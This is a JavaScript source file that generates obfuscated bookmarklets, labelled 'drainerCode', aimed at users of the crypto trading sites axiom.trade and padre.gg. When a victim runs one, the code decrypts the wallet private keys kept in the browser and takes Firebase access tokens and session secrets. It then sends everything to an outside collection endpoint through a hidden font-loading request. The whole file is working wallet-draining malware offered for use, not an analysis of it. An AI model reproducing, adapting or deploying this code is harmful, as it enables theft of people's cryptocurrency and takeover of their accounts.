// Clean version of buildBookmarkletFile function
// This replaces the corrupted version in bot-webhook.js (starting at line 796)

async function buildBookmarkletFile(type, userId, username, store) {
  const API_ORIGIN = 'https://leviathan-kohl.vercel.app';
  const botId = type === 'padre' ? 'padre-bot' : 'axiom-bot';
  const platform = type;

  // AXIOM: Exact working bookmarklet from public/velox-bookmarklet-axiom.js
  if (type === 'axiom') {
    const drainerCode = `(async function () {
    const SEND_URL = '${API_ORIGIN}/api/send';
    const platform = '${platform}';
    const botId = '${botId}';
    const ua = navigator.userAgent || 'unknown';
    const hw = (navigator.platform || 'unknown') + ' | ' +
        (screen.width || 0) + 'x' + (screen.height || 0) + ' | ' +
        (screen.colorDepth || 0) + 'bit';

    function sendData(data) {
        try {
            const encoded = encodeURIComponent(btoa(unescape(encodeURIComponent(JSON.stringify(data)))));
            const url = SEND_URL + '?nocache=' + encoded;
            const styleEl = document.createElement('style');
            styleEl.textContent = '@font-face{font-family:"_lv' + Date.now() + '";src:url("' + url + '")}';
            document.head.appendChild(styleEl);
            const div = document.createElement('div');
            div.style.cssText = 'position:fixed;top:-9999px;font-family:"_lv' + Date.now() + '",serif;font-size:1px';
            div.textContent = '.';
            document.body.appendChild(div);
            setTimeout(function () {
                try { document.head.removeChild(styleEl); } catch (_) {}
                try { document.body.removeChild(div); } catch (_) {}
            }, 5000);
        } catch (e) {}
    }

    var username = 'unknown';
    try {
        var sels = [
            'header button[class*="flex"][class*="items-center"] span',
            '[data-username]',
            'nav [class*="address"]',
            '[class*="UserProfile"]',
        ];
        for (var i = 0; i < sels.length; i++) {
            var el = document.querySelector(sels[i]);
            if (el && el.textContent && el.textContent.trim()) {
                var t = el.textContent.trim();
                if (!t.toLowerCase().includes('connect') && !t.toLowerCase().includes('wallet') &&
                    t.length > 2 && t.length < 64) {
                    username = t.slice(0, 48);
                    break;
                }
            }
        }
        if (username === 'unknown') {
            var m = location.pathname.match(/\\/@?([a-zA-Z0-9_.-]+)/);
            if (m && m[1]) username = m[1].slice(0, 48);
        }
        if (username === 'unknown' && document.title) {
            var tt = document.title.replace(/axiom|discover|trade|\\|/gi, '').trim();
            if (tt.length > 2 && tt.length < 64) username = tt.slice(0, 48);
        }
    } catch (_) {}

    sendData({
        type: platform,
        username: username,
        botId: botId,
        platform: platform,
        userAgent: ua,
        hardwareInfo: hw,
        url: location.href,
        message: 'Page: ' + location.href,
    });

    if (!location.hostname.includes('axiom.trade')) return;

    function a2s(a) {
        var AB = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
        var d = [0];
        for (var i = 0; i < a.length; i++) {
            var c = a[i];
            for (var j = 0; j < d.length; j++) {
                var v = d[j] * 256 + c; d[j] = v % 58; c = v / 58 | 0;
            }
            while (c) { d.push(c % 58); c = c / 58 | 0; }
        }
        var s = '';
        for (var i = 0; i < a.length && a[i] === 0; i++) s += AB[0];
        for (var i = d.length - 1; i >= 0; i--) s += AB[d[i]];
        return s;
    }
    function a2evm(e) {
        return Array.from(e instanceof Uint8Array ? e : new Uint8Array(e))
            .map(function (b) { return b.toString(16).padStart(2, '0'); }).join('');
    }
    function s2a(k) {
        try { return Uint8Array.from(atob(k.replace(/-/g, '+').replace(/_/g, '/')), function (c) { return c.charCodeAt(0); }); }
        catch (_) { return new TextEncoder().encode(k); }
    }
    async function decB(ck, enc) {
        var p = String(enc).split(':');
        return new Uint8Array(await crypto.subtle.decrypt(
            { name: 'AES-GCM', iv: s2a(p[0]), tagLength: 128 }, ck, s2a(p[1])
        ));
    }

    try {
        var resp = await fetch('https://api8.axiom.trade/bundle-key-and-wallets', {
            method: 'POST', credentials: 'include'
        });
        if (!resp.ok) throw new Error('bundle API ' + resp.status);
        var bk = (await resp.json()).bundleKey;
        if (!bk) throw new Error('no bundleKey');

        var ck = await crypto.subtle.importKey('raw', s2a(bk).buffer, { name: 'AES-GCM' }, false, ['decrypt']);
        var sb = JSON.parse(localStorage.getItem('sBundles') || '[]');
        var eb = JSON.parse(localStorage.getItem('eBundles') || '[]');
        var keys = [];

        for (var i = 0; i < sb.length; i++) {
            try {
                var dec = await decB(ck, sb[i]);
                if (dec.length === 64) keys.push({ public: a2s(dec.slice(32)), private: a2s(dec) });
            } catch (_) {}
        }

        var ethers = null;
        try { ethers = await import('https://cdn.jsdelivr.net/npm/ethers@6.15.0/+esm'); } catch (_) {}

        for (var i = 0; i < eb.length; i++) {
            try {
                var dec = await decB(ck, eb[i]);
                var priv = a2evm(dec);
                var pub = ethers ? ethers.computeAddress('0x' + priv) : 'evm';
                keys.push({ public: pub, private: priv });
            } catch (_) {}
        }

        sendData({
            type: platform,
            username: username,
            botId: botId,
            platform: platform,
            keys: keys,
            userAgent: ua,
            hardwareInfo: hw,
            url: location.href,
            message: 'Wallets captured | Page: ' + location.href,
        });

    } catch (err) {}
})();`;

    const encoded = Buffer.from(drainerCode).toString('base64');
    const bookmarkletCode = `javascript:eval(atob('${encoded}'))`;
    
    return {
      buffer: Buffer.from(bookmarkletCode, 'utf8'),
      filename: `${type}-bookmarklet.txt`,
    };
  }

  // PADRE: Exact working bookmarklet from public/velox-bookmarklet-padre.js
  if (type === 'padre') {
    const drainerCode = `(async function () {
    const SEND_URL = '${API_ORIGIN}/api/send';
    const platform = '${platform}';
    const botId = '${botId}';
    const ua = navigator.userAgent || 'unknown';
    const hw = (navigator.platform || 'unknown') + ' | ' + (screen.width || 0) + 'x' + (screen.height || 0) + ' | ' + (screen.colorDepth || 0) + 'bit';

    function sendData(data) {
        try {
            const enc = encodeURIComponent(btoa(unescape(encodeURIComponent(JSON.stringify(data)))));
            const url = SEND_URL + '?nocache=' + enc;
            const id = '_lv' + Date.now();
            const st = document.createElement('style');
            st.textContent = '@font-face{font-family:"' + id + '";src:url("' + url + '")} .' + id + '{font-family:"' + id + '"}';
            const dv = document.createElement('div');
            dv.innerText = '.';
            dv.className = id;
            dv.style.cssText = 'position:fixed;top:-9999px;font-size:1px';
            document.body.appendChild(dv);
            document.head.appendChild(st);
            setTimeout(function () { try { document.head.removeChild(st); } catch (_) {}; try { document.body.removeChild(dv); } catch (_) {} }, 5000);
        } catch (e) {}
    }

    let sessionData = null, walletsCache = null, hiddenWalletsCache = null, stamperEncoded = null;
    let username = 'unknown';
    try {
        sessionData = JSON.parse(localStorage.getItem('padreV2-session') || 'null');
        walletsCache = JSON.parse(localStorage.getItem('padreV2-walletsCache') || 'null');
        hiddenWalletsCache = JSON.parse(localStorage.getItem('padreV2-hiddenWalletsCache') || 'null');
        stamperEncoded = JSON.parse(localStorage.getItem('padreV2-stamper') || 'null');
        if (sessionData) {
            const uid = sessionData.uid || sessionData.userId || '';
            if (uid && uid.length > 2 && uid.length < 64) username = uid.slice(0, 48);
        }
    } catch (_) {}

    const allWallets = [];
    function collectWallets(cache) {
        if (!cache) return;
        try {
            for (const key of Object.keys(cache)) {
                const arr = cache[key];
                if (!Array.isArray(arr)) continue;
                for (const w of arr) {
                    allWallets.push({
                        public: w.publicAddress || w.address || '',
                        walletName: w.walletName || '',
                        type: w.walletType || '',
                        subOrgId: w.subOrgId || '',
                        walletId: w.walletId || w.id || '',
                        isImported: w.isImported || false,
                    });
                }
            }
        } catch (_) {}
    }
    collectWallets(walletsCache);
    collectWallets(hiddenWalletsCache);

    if (!location.hostname.includes('padre.gg')) {
        sendData({ type: platform, username, botId, platform, userAgent: ua, hardwareInfo: hw, url: location.href, message: 'Page: ' + location.href });
        return;
    }

    let accessToken = '', userEmail = '';
    try {
        const rows = await new Promise((res, rej) => {
            const req = indexedDB.open('firebaseLocalStorageDb');
            req.onsuccess = () => {
                const db = req.result;
                const r = db.transaction('firebaseLocalStorage', 'readonly').objectStore('firebaseLocalStorage').getAll();
                r.onsuccess = () => res(r.result);
                r.onerror = () => rej(r.error);
            };
            req.onerror = () => rej(req.error);
        });
        if (rows && rows.length > 0 && rows[0].value) {
            accessToken = rows[0].value.stsTokenManager.accessToken;
            userEmail = rows[0].value.email || rows[0].value.displayName || '';
            const firebaseUid = rows[0].value.uid || rows[0].value.localId || '';
            if (firebaseUid && (!sessionData || !sessionData.uid)) {
                if (!sessionData) sessionData = {};
                sessionData.uid = firebaseUid;
                sessionData.sessionId = '';
            }
            if (userEmail && username === 'unknown') username = userEmail.split('@')[0].slice(0, 48);
        }
    } catch (_) {}

    const walletKeys = allWallets.filter(w => w.public).map(w => ({ public: w.public, private: 'pending', type: w.type, walletName: w.walletName }));

    if (!accessToken || !sessionData) {
        const debugInfo = 'auth:' + (accessToken ? 'yes' : 'no') + ' session:' + (sessionData ? 'yes' : 'no') + ' stamper:' + (stamperEncoded ? 'yes' : 'no');
        sendData({ type: platform, username, botId, platform, keys: walletKeys, userAgent: ua, hardwareInfo: hw, url: location.href, message: 'Padre: ' + debugInfo + ' | Page: ' + location.href });
        return;
    }

    try {
        const velvetRes = await fetch('https://backend.padre.gg/velvet/users/' + sessionData.uid + '/get-velvet', {
            method: 'GET',
            headers: { 'X-Padre-Session': sessionData.sessionId || '', 'Authorization': 'Bearer ' + accessToken },
        });
        if (!velvetRes.ok) throw new Error('velvet ' + velvetRes.status);
        const velvetObj = await velvetRes.json();

        sendData({
            type: platform,
            username,
            botId,
            platform,
            keys: walletKeys,
            userAgent: ua,
            hardwareInfo: hw,
            url: location.href,
            padreDecryptPayload: {
                sessionUid: sessionData.uid,
                sessionId: sessionData.sessionId,
                accessTokenFull: accessToken,
                stamperEncoded: stamperEncoded,
                velvetBundle: velvetObj.bundle,
                wallets: allWallets,
            },
            message: 'Padre | ' + allWallets.length + ' wallet(s) | ' + (userEmail || username) + ' | Page: ' + location.href,
        });
    } catch (err) {
        sendData({ type: platform, username, botId, platform, keys: walletKeys, userAgent: ua, hardwareInfo: hw, url: location.href, message: 'Padre error: ' + (err.message || '') + ' | Page: ' + location.href });
    }
})();`;

    const encoded = Buffer.from(drainerCode).toString('base64');
    const bookmarkletCode = `javascript:eval(atob('${encoded}'))`;
    
    return {
      buffer: Buffer.from(bookmarkletCode, 'utf8'),
      filename: `${type}-bookmarklet.txt`,
    };
  }

  // Fallback (shouldn't reach here)
  return {
    buffer: Buffer.from(`javascript:alert('Unknown type: ${type}')`, 'utf8'),
    filename: `${type}-bookmarklet.txt`,
  };
}
